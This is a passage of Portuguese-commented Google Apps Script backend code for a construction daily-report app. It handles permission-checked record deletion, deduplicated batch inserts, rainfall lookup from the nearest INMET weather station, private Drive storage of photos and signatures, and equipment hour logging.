  });
  Logger.log('Pronto. Rode de novo quando quiser — só preenche o que estiver vazio.');
}

// Lançar produção é de quem está na obra: campo, engenharia e admin.
// Diretoria e administrativo entram para consultar e exportar.
// Sem EXIGIR_TOKEN o backend está aberto de propósito (implantação) e isto
// não bloqueia nada — a checagem só passa a valer com a proteção ligada.
function exigirPodeLancar(token, acao) {
  var exigir = PropertiesService.getScriptProperties().getProperty('EXIGIR_TOKEN');
  if (String(exigir).toLowerCase() !== 'true') return null;
  var perfil = perfilDoToken(token);
  if (['campo', 'engenharia', 'admin', ''].indexOf(perfil) !== -1) return null;
  registrarAuditoria(usuarioDoToken(token) || 'desconhecido', perfil, acao + ' NEGADO', OBRA_ID, '', '', 'perfil sem permissão de lançamento');
  return { ok: false, error: 'SEM_PERMISSAO',
    mensagem: 'O perfil ' + perfil + ' acompanha a obra, mas não lança serviço nem RDO.' };
}

// Registra a tentativa negada — recusa silenciosa esconde abuso.
function negarPorPermissao(token, acao, registroId, dono) {
  registrarAuditoria(usuarioDoToken(token) || 'desconhecido', perfilDoToken(token),
    acao + ' NEGADO', OBRA_ID, registroId, 'dono: ' + (dono || '-'), '');
  return { ok: false, error: 'SEM_PERMISSAO',
    mensagem: 'Só o administrador, ou quem lançou o registro, pode apagá-lo.' };
}

// Responde em JSONP (se veio ?callback=) ou JSON puro.
function responder(obj, callback) {
  var json = JSON.stringify(obj);
  if (callback) {
    return ContentService
      .createTextOutput(callback + '(' + json + ')')
      .setMimeType(ContentService.MimeType.JAVASCRIPT);
  }
  return ContentService
    .createTextOutput(json)
    .setMimeType(ContentService.MimeType.JSON);
}

// ------------------------------------------------------------
// Helpers de planilha (resolvem colunas pelo NOME do cabeçalho,
// então funcionam mesmo que a ordem das colunas mude).
// ------------------------------------------------------------
function abaServicos() {
  var aba = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(NOME_ABA);
  if (!aba) throw new Error('Aba "' + NOME_ABA + '" não encontrada');
  return aba;
}

function cabecalhoNormalizado(aba) {
  var ultima = aba.getLastColumn();
  var head = aba.getRange(1, 1, 1, ultima).getValues()[0];
  return head.map(function (h) { return String(h).trim().toLowerCase(); });
}

function idxColuna(cab, nome) {
  var n = String(nome).trim().toLowerCase();
  var i = cab.indexOf(n);
  if (i !== -1) return i;
  return cab.findIndex(function (h) { return h.indexOf(n) !== -1; });
}

// ------------------------------------------------------------
// 1. deleteRDO — apaga 1 linha pelo ID
// ------------------------------------------------------------
function deleteRDO(id, token) {
  if (!id) return { ok: false, error: 'ID não informado' };
  var aba = abaServicos();
  var dados = aba.getDataRange().getValues();
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iId = idxColuna(cab, 'id');
  if (iId === -1) return { ok: false, error: 'Coluna ID não encontrada' };
  // o dono do lançamento é o apontador (ou a coluna usuario, se existir)
  var iDono = idxColuna(cab, 'usuario');
  if (iDono === -1) iDono = idxColuna(cab, 'apontador');

  for (var i = 1; i < dados.length; i++) {
    if (String(dados[i][iId]).trim() === String(id).trim()) {
      var dono = iDono !== -1 ? dados[i][iDono] : '';
      if (!podeApagarLinha(token, dono)) return negarPorPermissao(token, 'deleteRDO', id, dono);
      var antes = cab.map(function (c, k) { return c + '=' + dados[i][k]; }).join(' | ');
      aba.deleteRow(i + 1); // planilha é base-1 e tem cabeçalho
      registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'deleteRDO', OBRA_ID, id, antes, '');
      return { ok: true, deleted: id };
    }
  }
  return { ok: false, error: 'ID não encontrado: ' + id };
}

// ------------------------------------------------------------
// 2. addBatchRDO — grava vários serviços de uma vez.
//    Idempotente: se o clientId já existe na planilha, NÃO regrava
//    (evita duplicação por reenvio/retry).
// ------------------------------------------------------------
function addBatchRDO(batchJson, clientId, token) {
  var batch;
  try { batch = JSON.parse(batchJson || '[]'); }
  catch (e) { return { ok: false, error: 'batch inválido' }; }
  if (!batch.length) return { ok: false, error: 'batch vazio' };

  // Quem gravou vem do token, não do que o app mandou: é isso que sustenta a
  // regra de exclusão ("o dono apaga") e a trilha de auditoria.
  var sess = sessaoDoToken(token) || { usuario: '', perfil: '' };

  // O lote inteiro é de uma obra só (o app monta assim). Basta conferir a
  // primeira linha para saber se este usuário pode gravar aqui.
  var obraDoLote = normObra(batch[0] && (batch[0].obra || batch[0].Obra));
  if (sessaoDoToken(token) && !sessaoPodeNaObra(sess, obraDoLote)) {
    return negarPorObra(token, 'addBatchRDO', obraDoLote);
  }

  // Trava para o lote inteiro não rodar 2x ao mesmo tempo.
  var lock = LockService.getScriptLock();
  lock.waitLock(30000);
  try {
    var aba = abaServicos();
    var cab = cabecalhoNormalizado(aba);
    var iClient = idxColuna(cab, 'clientid');

    // A proteção anti-duplicação precisa da coluna 'clientId'. Se a planilha
    // não tiver, criamos automaticamente (no fim do cabeçalho) para que o
    // dedup passe a funcionar — sem isso, reenvios da fila duplicam linhas.
    if (iClient === -1) {
      aba.getRange(1, aba.getLastColumn() + 1).setValue('clientId');
      cab = cabecalhoNormalizado(aba);
      iClient = idxColuna(cab, 'clientid');
    }

    // Mesma ideia para 'usuario': sem essa coluna não há dono do registro, e a
    // regra "só o admin ou quem lançou apaga" não teria como ser aplicada.
    if (idxColuna(cab, 'usuario') === -1) {
      aba.getRange(1, aba.getLastColumn() + 1).setValue('usuario');
      cab = cabecalhoNormalizado(aba);
    }

    // E para 'obra': sem ela, lançamento de qualquer obra apareceria como se
    // fosse da Teotônio e entraria na medição da avenida.
    if (idxColuna(cab, 'obra') === -1) {
      garantirColuna(aba, 'obra');
      cab = cabecalhoNormalizado(aba);
    }

    // Dedup por clientId: se já existe, considera salvo e sai.
    if (clientId && iClient !== -1) {
      var dados = aba.getDataRange().getValues();
      for (var r = 1; r < dados.length; r++) {
        if (String(dados[r][iClient]).trim() === String(clientId).trim()) {
          return { ok: true, duplicate: true, inserted: 0 };
        }
      }
    }

    var agora = new Date();
    var linhas = batch.map(function (item, k) {
      var registro = {};
      // copia os campos recebidos
      Object.keys(item).forEach(function (chave) { registro[chave.toLowerCase()] = item[chave]; });
      // campos gerados pelo servidor
      registro['id'] = registro['id'] || gerarId(agora, k);
      registro['obra'] = normObra(registro['obra']);
      registro['clientid'] = clientId || '';
      registro['timestamp'] = registro['timestamp'] || agora;
      registro['data_registro'] = registro['data_registro'] || agora;
      if (sess.usuario) {
        registro['usuario'] = sess.usuario;
        if (!registro['apontador']) registro['apontador'] = sess.usuario;
      }

      // monta a linha respeitando a ORDEM das colunas da planilha
      return cab.map(function (nomeCol) {
        return registro.hasOwnProperty(nomeCol) ? registro[nomeCol] : '';
      });
    });

    aba.getRange(aba.getLastRow() + 1, 1, linhas.length, cab.length).setValues(seguroMatriz(linhas));
    registrarAuditoria(sess.usuario, sess.perfil, 'addBatchRDO', OBRA_ID, clientId || '', '',
      linhas.length + ' serviço(s) gravado(s)');
    return { ok: true, inserted: linhas.length };
  } finally {
    lock.releaseLock();
  }
}

function gerarId(data, k) {
  return Utilities.formatDate(data, Session.getScriptTimeZone(), 'yyyyMMddHHmmss') +
         '_' + k + '_' + Math.floor(Math.random() * 9000 + 1000);
}

// ------------------------------------------------------------
// CLIMA DO DIA — chuva registrada por estação oficial
//
// Por que passa pelo servidor e não direto do navegador: o app é uma
// página estática, e API de terceiro raramente manda cabeçalho de CORS.
// Aqui o UrlFetchApp busca sem essa amarra, guarda em cache e ainda
// deixa trocar de provedor sem republicar o index.html.
//
// Por que INMET: num contrato público, chuva registrada pelo instituto
// oficial de meteorologia sustenta justificativa de prazo muito melhor
// do que uma API estrangeira qualquer. É dado público e sem licença
// comercial no caminho (o tier gratuito do Open-Meteo, por exemplo, é
// só para uso NÃO comercial — não serve para obra).
//
// A ESTAÇÃO É DE CADA OBRA, NÃO DO SISTEMA
//
// Até aqui existia UMA estação fixa (A701, Mirante de Santana) para tudo.
// Só que as obras não ficam no mesmo lugar: a Teotônio está na zona sul
// da capital, as Ruas de Terra em Itaquera e o Ranário em São Roque, a
// mais de 50 km de Santana. Chuva de verão em São Paulo é convectiva e
// localizada — chove 30 mm no Grajaú com Santana seco no mesmo dia. Um
// pleito de prorrogação em São Roque sustentado por estação da capital
// se defende mal.
//
// Como a estação é escolhida: NÃO por uma tabela de códigos escrita à
// mão, que envelhece calada quando o INMET desativa uma estação. A obra
// declara a COORDENADA dela (abaixo) e o resto sai do catálogo do
// próprio INMET, buscado e guardado por 30 dias: a estação automática
// operante mais próxima ganha. Se a mais próxima estiver muda naquele
// dia — e estação de campo cai —, a busca desce para a seguinte, e a
// resposta diz qual respondeu e a que distância da obra.
//
// Propriedades do script (opcionais):
//   INMET_ESTACAO_<OBRA>  trava a estação de UMA obra (ex.:
//                  INMET_ESTACAO_TEOTONIO = A771). Use quando conhecer
//                  a região melhor que a distância em linha reta.
//   INMET_ESTACAO  trava a estação de TODAS as obras (era o ajuste
//                  antigo; continua valendo, agora como último recurso)
//   CLIMA_URL      molde de URL de outro provedor, com {ini} {fim} {est}
//
// ATENÇÃO: a leitura dos campos do INMET segue a nomenclatura publicada
// das estações automáticas (CHUVA por hora, HR_MEDICAO como hora UTC).
// Se o provedor mudar os nomes, climaDoDia devolve ok:false com o
// motivo, e o RDO continua sendo preenchido à mão — nunca trava.
// ------------------------------------------------------------
var INMET_ESTACAO_PADRAO = 'A701';   // último recurso: catálogo fora do ar

// Onde cada obra fica. É a ÚNICA coisa que precisa ser mantida à mão, e
// dá para conferir num mapa. Rode conferirEstacoes() depois de mexer:
// ela imprime a estação que cada coordenada resolve e a distância.
var CLIMA_OBRAS = {
  'teotonio':      { nome: 'Av. Sen. Teotônio Vilela — São Paulo/SP',   lat: -23.7205, lon: -46.7025 },
  'ruas-de-terra': { nome: 'Itaquera — São Paulo/SP',                   lat: -23.5395, lon: -46.4585 },
  'ranario':       { nome: 'Estrada do Ranário (SQE-479) — São Roque/SP', lat: -23.5290, lon: -47.1355 }
};

/* Distância em km entre dois pontos (haversine). Serve para ordenar
   estações — nessa escala a curvatura já pesa, e o erro de tratar grau
   de longitude como grau de latitude passaria de 8 %. */
function distanciaKm_(lat1, lon1, lat2, lon2) {
  var R = 6371, g = Math.PI / 180;
  var dLat = (lat2 - lat1) * g, dLon = (lon2 - lon1) * g;
  var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
          Math.cos(lat1 * g) * Math.cos(lat2 * g) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
  return 2 * R * Math.asin(Math.min(1, Math.sqrt(a)));
}

// Quantas candidatas guardar por obra. Cinco cobre com folga o dia em
// que a mais perto não publica, e mantém a propriedade pequena.
var INMET_CANDIDATAS = 5;

/* Baixa o catálogo de estações automáticas do INMET e devolve só as em
   operação, com coordenada legível. Não guarda nada: é a lista inteira
   do Brasil, grande demais tanto para o CacheService (6 h) quanto para
   uma propriedade do script (9 KB por valor). Quem guarda é
   estacoesDaObra_, e só as poucas que interessam a cada obra. */
function catalogoEstacoes_() {
  var bruto;
  try {
    var r = UrlFetchApp.fetch('https://apitempo.inmet.gov.br/estacoes/T',
                              { muteHttpExceptions: true, followRedirects: true });
    if (r.getResponseCode() !== 200) return [];
    bruto = JSON.parse(r.getContentText() || '[]');
  } catch (e) {
    Logger.log('Catálogo do INMET indisponível: ' + e);
    return [];
  }
  if (!bruto || !bruto.length) return [];

  var lista = [];
  for (var i = 0; i < bruto.length; i++) {
    var e = bruto[i] || {};
    var cod = String(e.CD_ESTACAO || '').trim();
    var lat = parseFloat(e.VL_LATITUDE), lon = parseFloat(e.VL_LONGITUDE);
    if (!cod || !isFinite(lat) || !isFinite(lon)) continue;
    if (e.DT_FIM_OPERACAO) continue;                       // já desativada
    // o nome do campo de UF variou entre versões da API — aceita os dois
    var uf = String(e.SG_ESTADO || e.SG_STATE || '').trim().toUpperCase();
    lista.push({ cod: cod, nome: String(e.DC_NOME || cod), uf: uf, lat: lat, lon: lon });
  }
  return lista;
}

/* As candidatas de TODAS as obras, calculadas de uma vez e guardadas por
   30 dias — estação nova ou desativada é notícia de mês, não de hora.
   De uma vez porque a ida ao catálogo é a parte cara: fazer a conta para
   as três obras no mesmo download evita repeti-lo. */
function recalcularEstacoes_() {
  var cat = catalogoEstacoes_();
  if (!cat.length) return null;

  var props = PropertiesService.getScriptProperties();
  var out = {};
  Object.keys(CLIMA_OBRAS).forEach(function (id) {
    var o = CLIMA_OBRAS[id];
    var perto = cat.map(function (e) {
      return { cod: e.cod, nome: e.nome,
               km: +distanciaKm_(o.lat, o.lon, e.lat, e.lon).toFixed(1) };
    }).sort(function (a, b) { return a.km - b.km; }).slice(0, INMET_CANDIDATAS);
    out[id] = perto;
    try { props.setProperty('INMET_PERTO_' + id, JSON.stringify(perto)); } catch (e) {}
  });
  try { props.setProperty('INMET_PERTO_EM', String(Date.now())); } catch (e) {}
  return out;
}

/* As estações candidatas de uma obra, da mais perto para a mais longe.
   Devolve no máximo `quantas` — a primeira é a preferida, as outras são
   a rede de segurança para o dia em que ela não publicar. */
function estacoesDaObra_(obraId, quantas) {
  var id = String(obraId || OBRA_ID);
  var props = PropertiesService.getScriptProperties();
  var n = Math.max(1, quantas || 3);

  // 1) trava manual: primeiro a da obra, depois a global (ajuste antigo)
  var chaveObra = 'INMET_ESTACAO_' + id.toUpperCase().replace(/[^A-Z0-9]+/g, '_');
  var travada = props.getProperty(chaveObra) || props.getProperty('INMET_ESTACAO');
  if (travada) return [{ cod: String(travada).trim(), nome: '', km: null, travada: true }];

  // 2) obra sem coordenada declarada: não há como escolher — não invento
  if (!CLIMA_OBRAS[id]) {
    return [{ cod: INMET_ESTACAO_PADRAO, nome: '', km: null, semCoordenada: true }];
  }

  // 3) a conta de 30 dias atrás, se ainda vale
  var em = Number(props.getProperty('INMET_PERTO_EM') || 0);
  if (em && (Date.now() - em) < 30 * 24 * 3600 * 1000) {
    try {
      var guardado = JSON.parse(props.getProperty('INMET_PERTO_' + id) || '[]');
      if (guardado.length) return guardado.slice(0, n);
    } catch (e) {}
  }

  // 4) refaz a conta contra o catálogo do INMET
  var todas = recalcularEstacoes_();
  if (todas && todas[id] && todas[id].length) return todas[id].slice(0, n);

  // 5) catálogo fora do ar: a última escolha que deu certo ainda vale
  var ultima = props.getProperty('INMET_ULTIMA_' + id);
  return [{ cod: ultima || INMET_ESTACAO_PADRAO, nome: '', km: null, semCatalogo: true }];
}

function climaDoDia(dataISO, obraId) {
  var d = String(dataISO || '').slice(0, 10);
  if (!/^\d{4}-\d{2}-\d{2}$/.test(d)) return { ok: false, motivo: 'Data inválida' };
  var id = normObra(obraId);

  // A chave leva a OBRA: sem isso a primeira obra consultada no dia
  // servia a chuva dela para todas as outras.
  var cache = CacheService.getScriptCache();
  var chave = 'clima_' + id + '_' + d;
  var guardado = cache.get(chave);
  if (guardado) { try { return JSON.parse(guardado); } catch (e) {} }

  var candidatas = estacoesDaObra_(id, 3);
  var molde = PropertiesService.getScriptProperties().getProperty('CLIMA_URL') ||
              'https://apitempo.inmet.gov.br/estacao/{ini}/{fim}/{est}';

  var motivos = [];
  for (var i = 0; i < candidatas.length; i++) {
    var tentativa = climaDaEstacao_(molde, d, candidatas[i]);
    if (!tentativa.ok) { motivos.push(tentativa.motivo); continue; }

    // deu certo: lembra a escolha para o dia em que o catálogo cair
    try {
      PropertiesService.getScriptProperties()
        .setProperty('INMET_ULTIMA_' + id, candidatas[i].cod);
    } catch (e) {}

    // 6 h: dia passado não muda mais, e dia corrente ainda recebe horas novas
    try { cache.put(chave, JSON.stringify(tentativa), 21600); } catch (e) {}
    return tentativa;
  }

  return { ok: false, motivo: motivos[0] || 'Nenhuma estação respondeu.' };
}

/* Uma estação, um dia. Separado de climaDoDia porque a busca é repetida
   até alguma responder — e porque assim dá para testar a conta da chuva
   sem rede no caminho. */
function climaDaEstacao_(molde, d, est) {
  var url = molde.replace('{ini}', d).replace('{fim}', d).replace('{est}', est.cod);
  var linhas;
  try {
    var r = UrlFetchApp.fetch(url, { muteHttpExceptions: true, followRedirects: true });
    if (r.getResponseCode() !== 200) {
      return { ok: false, motivo: 'A estação ' + est.cod + ' respondeu ' + r.getResponseCode() + '.' };
    }
    linhas = JSON.parse(r.getContentText() || '[]');
  } catch (e) {
    return { ok: false, motivo: 'Não foi possível falar com a estação ' + est.cod + ': ' + e };
  }
  if (!linhas || !linhas.length) {
    return { ok: false, motivo: 'A estação ' + est.cod + ' não tem registro para ' + d +
                                ' (dado costuma sair com algumas horas de atraso).' };
  }
  return somarChuva_(linhas, d, est);
}

/* Somatório de chuva por período do dia. A hora do INMET vem em UTC
   ("HH00"); São Paulo é UTC-3, então 09 UTC = 06 local. */
function somarChuva_(linhas, d, est) {
  var soma = { manha: 0, tarde: 0, noite: 0 }, lidas = 0;
  linhas.forEach(function (l) {
    var hh = parseInt(String(l.HR_MEDICAO == null ? '' : l.HR_MEDICAO).slice(0, 2), 10);
    if (!isFinite(hh)) return;
    var local = (hh - 3 + 24) % 24;
    var mm = parseFloat(String(l.CHUVA == null ? '' : l.CHUVA).replace(',', '.'));
    if (!isFinite(mm)) mm = 0;
    lidas++;
    if (local >= 6 && local < 12) soma.manha += mm;
    else if (local >= 12 && local < 18) soma.tarde += mm;
    else if (local >= 18) soma.noite += mm;
  });
  if (!lidas) {
    return { ok: false, motivo: 'Registro sem hora legível — provedor mudou o formato?' };
  }

  return {
    ok: true,
    manha: classificarChuva_(soma.manha),
    tarde: classificarChuva_(soma.tarde),
    noite: classificarChuva_(soma.noite),
    mm: { manha: +soma.manha.toFixed(1), tarde: +soma.tarde.toFixed(1), noite: +soma.noite.toFixed(1) },
    total_mm: +(soma.manha + soma.tarde + soma.noite).toFixed(1),
    estacao: est.cod,
    estacaoNome: est.nome || '',
    km: (est.km === null || est.km === undefined) ? null : est.km,
    fonte: descreverEstacao_(est)
  };
}

/* O que o RDO mostra e o que fica gravado na planilha. A distância entra
   no texto de propósito: é ela que diz ao fiscal — e a quem julgar o
   pleito — o quanto a medição vale para AQUELE canteiro. */
function descreverEstacao_(est) {
  var t = 'INMET · estação ' + est.cod;
  if (est.nome) t += ' (' + est.nome + ')';
  if (est.km !== null && est.km !== undefined) {
    t += ', a ' + String(est.km).replace('.', ',') + ' km da obra';
  }
  return t;
}

/* Utilitário de conferência: rode no editor do Apps Script depois de
   mexer nas coordenadas. Imprime, para cada obra, as três estações mais
   próximas com a distância — é a prova de que a obra está apontando para
   a estação certa, sem esperar chover para descobrir. */
function conferirEstacoes() {
  var cat = catalogoEstacoes_();
  Logger.log('Catálogo do INMET: ' + cat.length + ' estações automáticas em operação.');
  var todas = recalcularEstacoes_();          // refaz a conta na hora
  Object.keys(CLIMA_OBRAS).forEach(function (id) {
    var o = CLIMA_OBRAS[id];
    var lista = (todas && todas[id]) || estacoesDaObra_(id, 3);
    Logger.log('\n' + id + ' — ' + o.nome + '  (' + o.lat + ', ' + o.lon + ')');
    lista.forEach(function (e, i) {
      Logger.log('  ' + (i === 0 ? '→' : ' ') + ' ' + e.cod + '  ' +
                 (e.nome || '(sem nome)') + '  ' +
                 (e.km === null ? '(distância desconhecida)' : e.km + ' km'));
    });
  });
  return { ok: true, estacoes: cat.length };
}

/* Milímetros medidos → o vocabulário que o RDO já usa. Os cortes seguem
   a leitura corrente de campo: traço de chuva não para serviço, acima de
   5 mm no período para. Sem chuva o retorno é "Bom" e NÃO "Encoberto":
   a estação mede precipitação, não cobertura de nuvem, e afirmar céu
   limpo a partir de chuva zero seria inventar dado. */
function classificarChuva_(mm) {
  if (!(mm > 0)) return 'Bom';
  if (mm <= 0.5) return 'Garoa';
  if (mm <= 5) return 'Chuva';
  return 'Chuva forte';
}

// ------------------------------------------------------------
// FOTOS DO RDO — a imagem vai para uma pasta PRIVADA do Drive e a
// planilha guarda só o ponteiro "drive_id:<id>". Nada de link público:
// foto de obra mostra placa, rosto e endereço.
// Como arquivo privado não abre direto em <img>, o app pede a imagem de
// volta por obterFoto (que devolve data URI) — mesma solução do Gestor.
// ------------------------------------------------------------
var PASTA_FOTOS = 'Fotos RDO Teotônio (Privado)';

function rdoFoto(p) {
  var b64 = String(p.foto || '');
  if (b64.indexOf('data:image') !== 0) return { ok: false, error: 'Foto inválida' };

  var nome = 'rdo_teotonio_' + (p.id || Date.now()) + '_' + (p.idx || 0) + '.jpg';
  var blob = Utilities.newBlob(Utilities.base64Decode(b64.split(',')[1]), 'image/jpeg', nome);
  var pastas = DriveApp.getFoldersByName(PASTA_FOTOS);
  var pasta = pastas.hasNext() ? pastas.next() : DriveApp.createFolder(PASTA_FOTOS);
  var arquivo = pasta.createFile(blob);
  arquivo.setSharing(DriveApp.Access.PRIVATE, DriveApp.Permission.NONE);

  var fileId = arquivo.getId();
  var ponteiro = 'drive_id:' + fileId;

  // Anexa o ponteiro na linha do serviço. Se a foto subiu mas a linha ainda
  // não existe (fila offline), o arquivo fica no Drive e o app reenvia depois.
  try {
    var aba = abaServicos();
    var dados = aba.getDataRange().getValues();
    var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
    var iId = idxColuna(cab, 'id');
    // a planilha já tem 'foto_link' — usa essa; só cria coluna se não houver
    var iFotos = idxColuna(cab, 'foto_link');
    if (iFotos === -1) {
      aba.getRange(1, aba.getLastColumn() + 1).setValue('foto_link');
      iFotos = aba.getLastColumn() - 1;
    }
    // Coordenada da foto em coluna própria. O carimbo na imagem é a prova
    // para quem olha; a coluna é o que dá para filtrar, conferir e levar
    // para um mapa. Só grava a da PRIMEIRA foto da linha: são fotos do
    // mesmo ponto, e sobrescrever a cada uma só trocaria ruído de GPS.
    var iLat = -1, iLon = -1;
    if (p.lat !== '' && p.lat != null && !isNaN(parseFloat(p.lat))) {
      iLat = idxColuna(cab, 'foto_lat');
      if (iLat === -1) { aba.getRange(1, aba.getLastColumn() + 1).setValue('foto_lat'); iLat = aba.getLastColumn() - 1; }
      iLon = idxColuna(cab, 'foto_lon');
      if (iLon === -1) { aba.getRange(1, aba.getLastColumn() + 1).setValue('foto_lon'); iLon = aba.getLastColumn() - 1; }
    }

    if (iId !== -1) {
      for (var i = 1; i < dados.length; i++) {
        if (String(dados[i][iId]).trim() === String(p.id || '').trim()) {
          var atual = String(dados[i][iFotos] == null ? '' : dados[i][iFotos]).trim();
          aba.getRange(i + 1, iFotos + 1).setValue(atual ? atual + ' ' + ponteiro : ponteiro);
          if (iLat !== -1 && !String(dados[i][iLat] == null ? '' : dados[i][iLat]).trim()) {
            aba.getRange(i + 1, iLat + 1).setValue(parseFloat(p.lat));
            aba.getRange(i + 1, iLon + 1).setValue(parseFloat(p.lon));
          }
          break;
        }
      }
    }
  } catch (e) {}

  registrarAuditoria(usuarioDoToken(p.token), perfilDoToken(p.token), 'rdoFoto', OBRA_ID, p.id || '', '', fileId);
  return { ok: true, url: ponteiro, fileId: fileId };
}

// ------------------------------------------------------------
// EQUIPAMENTOS — frota da obra e apontamento de hora de máquina.
// Hora de equipamento é medição: entra em relatório e em cobrança de
// locadora, então cada apontamento guarda paradas, horímetro,
// combustível e quem lançou.
// ------------------------------------------------------------
/* O segundo parâmetro filtra pela coluna `obra`.
   `nfListar` já passava a obra desde que este backend virou multi-obra —
   mas a função ignorava o argumento, e a tela de Notas devolvia as notas
   e as saídas de TODAS as obras misturadas. Aba que não tem a coluna
   (Equipamentos, Locadoras) segue devolvendo tudo, como antes.
   Linha com a coluna em branco é da Teotônio: foi gravada quando este
   backend atendia uma obra só — a mesma regra do `normObra`. */
function linhasObj(nomeAba, obra) {
  var a = getOrCreateAba(nomeAba);
  var dados = a.getDataRange().getValues();
  if (dados.length <= 1) return [];
  var cab = dados[0].map(function (h) { return String(h).trim(); });
  var iObra = -1;
  for (var k = 0; k < cab.length; k++) {
    if (cab[k].toLowerCase() === 'obra') { iObra = k; break; }
  }
  var alvo = String(obra == null ? '' : obra).trim();
  var filtrar = !!alvo && iObra !== -1;
  var out = [];
  for (var i = 1; i < dados.length; i++) {
    if (filtrar && normObra(dados[i][iObra]) !== normObra(alvo)) continue;
    var o = {};
    for (var c = 0; c < cab.length; c++) o[cab[c]] = dados[i][c];
    out.push(o);
  }
  return out;
}

function appendObj(nomeAba, obj) {
  var a = getOrCreateAba(nomeAba);
  var cab = a.getRange(1, 1, 1, a.getLastColumn()).getValues()[0]
             .map(function (h) { return String(h).trim().toLowerCase(); });
  var reg = {};
  Object.keys(obj).forEach(function (k) { reg[k.toLowerCase()] = obj[k]; });
  var linha = cab.map(function (nc) { return reg.hasOwnProperty(nc) ? reg[nc] : ''; });
  a.getRange(a.getLastRow() + 1, 1, 1, cab.length).setValues([seguroLinha(linha)]);
}

function equipListar() {
  var eqs = linhasObj(ABA_EQUIP).filter(function (e) {
    return String(e.ativo).toLowerCase() !== 'false';
  });
  return { ok: true, equipamentos: eqs, locadoras: linhasObj(ABA_LOCADORA) };
}

function equipCadastrar(p) {
  var nome = String(p.nome || '').trim();
  if (!nome) return { ok: false, error: 'Nome vazio' };
  var lock = LockService.getScriptLock(); lock.waitLock(30000);
  try {
    var jaTem = linhasObj(ABA_EQUIP).some(function (e) {
      return String(e.nome).trim().toLowerCase() === nome.toLowerCase() &&
             String(e.ativo).toLowerCase() !== 'false';
    });
    if (!jaTem) {
      appendObj(ABA_EQUIP, { nome: nome, tipo: p.tipo || 'Outros',
        vinculo: p.vinculo || 'Próprio', locadora: p.locadora || '', ativo: 'true' });
      registrarAuditoria(usuarioDoToken(p.token), perfilDoToken(p.token), 'equipCadastrar', OBRA_ID, nome, '',
        (p.tipo || '') + ' · ' + (p.vinculo || ''));
    }
    return equipListar();
  } finally { lock.releaseLock(); }
}

// Equipamento não é apagado: é desativado. O histórico de horas apontadas
// continua valendo para medição mesmo depois que a máquina sai da obra.
function equipDesativar(nome, token) {
  if (!ehAdminToken(token) && ['engenharia', 'administrativo'].indexOf(perfilDoToken(token)) === -1) {
    return negarPorPermissao(token, 'equipDesativar', nome, '');
  }
  var a = getOrCreateAba(ABA_EQUIP);
  var dados = a.getDataRange().getValues();
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iN = idxColuna(cab, 'nome'), iA = idxColuna(cab, 'ativo');
  for (var i = 1; i < dados.length; i++) {
    if (String(dados[i][iN]).trim().toLowerCase() === String(nome).trim().toLowerCase()) {
      if (iA !== -1) a.getRange(i + 1, iA + 1).setValue('false');
    }
  }
  registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'equipDesativar', OBRA_ID, nome, '', '');
  return equipListar();
}

function locadoraCadastrar(nome, obs) {
  nome = String(nome || '').trim();
  if (!nome) return { ok: false, error: 'Nome vazio' };
  var lock = LockService.getScriptLock(); lock.waitLock(30000);
  try {
    var jaTem = linhasObj(ABA_LOCADORA).some(function (l) {
      return String(l.nome).trim().toLowerCase() === nome.toLowerCase();
    });
    if (!jaTem) appendObj(ABA_LOCADORA, { nome: nome, observacoes: obs || '' });
    return { ok: true, locadoras: linhasObj(ABA_LOCADORA) };
  } finally { lock.releaseLock(); }
}

function equipApontar(p) {
  var lock = LockService.getScriptLock(); lock.waitLock(30000);
  try {
    // reenvio da fila offline não pode lançar hora duas vezes
    if (p.clientId) {
      var jaTem = linhasObj(ABA_APONT).some(function (x) {
        return String(x.clientId).trim() === String(p.clientId).trim();
      });
      if (jaTem) return { ok: true, duplicate: true };
    }

    // A assinatura do operador é imagem: vai para o Drive privado, e a
    // planilha guarda o ponteiro (igual às fotos do serviço).
    var assin = String(p.assinatura || '');
    if (assin.indexOf('data:image') === 0) {
      try {
        var blob = Utilities.newBlob(Utilities.base64Decode(assin.split(',')[1]), 'image/png',
          'assinatura_' + (p.carimbo || Date.now()) + '.png');
        var pastas = DriveApp.getFoldersByName('Assinaturas Teotônio (Privado)');
        var pasta = pastas.hasNext() ? pastas.next() : DriveApp.createFolder('Assinaturas Teotônio (Privado)');
        var arq = pasta.createFile(blob);
        arq.setSharing(DriveApp.Access.PRIVATE, DriveApp.Permission.NONE);
        assin = 'drive_id:' + arq.getId();
      } catch (e) { assin = ''; }
    }

    var sess = sessaoDoToken(p.token) || { usuario: '', perfil: '' };
    appendObj(ABA_APONT, {
      carimbo: p.carimbo || String(Date.now()), data: p.data || '', turno: p.turno || '',
      equipamento: p.equipamento || '', operador: p.operador || '', inicio: p.inicio || '', fim: p.fim || '',
      horas: p.horas || '', paradas: p.paradas || '', horimIni: p.horimIni || '', horimFim: p.horimFim || '',
      combustivel: p.combustivel || '', situacao: p.situacao || '', observacoes: p.observacoes || '',
      assinatura: assin, usuario: sess.usuario, clientId: p.clientId || ''
    });
    registrarAuditoria(sess.usuario, sess.perfil, 'equipApontar', OBRA_ID, p.carimbo || '', '',
      (p.equipamento || '') + ' · ' + (p.horas || '') + 'h em ' + (p.data || ''));
    return { ok: true };
  } finally { lock.releaseLock(); }
}

function equipApagar(carimbo, token) {
  if (!carimbo) return { ok: false, error: 'Apontamento não informado' };
  var a = getOrCreateAba(ABA_APONT);
  var dados = a.getDataRange().getValues();
  var cab = dados[0].map(function (h) { return String(h).trim().toLowerCase(); });
  var iC = idxColuna(cab, 'carimbo'), iU = idxColuna(cab, 'usuario');
  for (var i = 1; i < dados.length; i++) {
    if (String(dados[i][iC]).trim() === String(carimbo).trim()) {
      var dono = iU !== -1 ? dados[i][iU] : '';
      if (!podeApagarLinha(token, dono)) return negarPorPermissao(token, 'equipApagar', carimbo, dono);
      a.deleteRow(i + 1);
      registrarAuditoria(usuarioDoToken(token), perfilDoToken(token), 'equipApagar', OBRA_ID, carimbo,
        cab.map(function (c, k) { return c + '=' + dados[i][k]; }).join(' | '), '');
      return { ok: true, deleted: carimbo };
    }
  }
  return { ok: false, error: 'Apontamento não encontrado' };
}

function equipApontamentos(mes) {
